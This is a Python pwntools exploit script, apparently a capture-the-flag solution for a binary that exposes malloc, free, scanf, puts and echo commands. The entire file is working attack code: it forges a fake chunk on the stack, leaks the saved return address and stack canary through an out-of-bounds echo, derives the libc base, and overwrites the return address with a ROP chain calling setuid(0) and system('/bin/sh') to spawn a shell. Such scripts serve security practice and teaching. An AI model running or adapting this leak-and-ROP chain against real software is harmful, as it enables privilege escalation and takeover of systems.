#!/bin/python

from pwn import *
import sys

#context.log_level='debug'
context.arch = 'amd64'

STACK_OFFSET = 0x38
SAVED_RIP_OFF= 0x58

def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


def echo(idx, offset):
    proc.clean()
    proc.sendline(b"echo")
    proc.sendline(str(idx))
    proc.sendline(str(offset))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


bin_idx = 16
def overwrite_next(contents: bytes):
    global bin_idx

    ret = bin_idx
    malloc(14, ret)
    malloc(15, ret)
    bin_idx += 16

    free(15)
    free(14)

    scanf(14, contents)
    return ret


def get_custom_ptr(contents: bytes):
    bin = overwrite_next(contents)
    malloc(13, bin)
    malloc(13, bin)

    return 13


def get_addr_num(addr: bytes):
    return u64(addr.ljust(8, b'\x00'))


if len(sys.argv) == 2:
    proc = process(sys.argv[1])
else:
    proc = gdb.debug(sys.argv[1], gdbscript='''
                     pwndbg-init
                     b main
                     c
                     nextret
                     ''')
elf = proc.elf
libc = elf.libc
if not libc:
    libc = ELF('/lib64/ld-linux-x86-64.so.2')

size = 16 * 9 
proc.sendline(b'stack_scanf')
proc.sendline(cyclic(STACK_OFFSET)+p64(size))
proc.sendline(b'stack_free')

malloc(0, size - 16)
saved_rip = get_addr_num((echo(0, SAVED_RIP_OFF)))
print("[$] saved rip: " + hex(saved_rip))

canary = echo(0, SAVED_RIP_OFF-0x10+1)[:7]
if len(canary) != 7:
    print(f"Canary {canary} not 7 bytes")
    exit(1)
canary = u64(canary.rjust(8, b'\x00'))
print("[$] Canary: " + hex(canary))

libc.address = (saved_rip - libc.symbols['__libc_start_main']) & 0xFFFFFFFFF000
print("[$] libc address: " + hex(libc.address))

rop = ROP(libc)
rop.setuid(0)
rop.system(next(libc.search(b'/bin/sh')))

print('\n' + rop.dump())

scanf(0, b'X' * (SAVED_RIP_OFF-0x10) + p64(canary) + b'Y' * 8 + rop.chain())

proc.interactive()
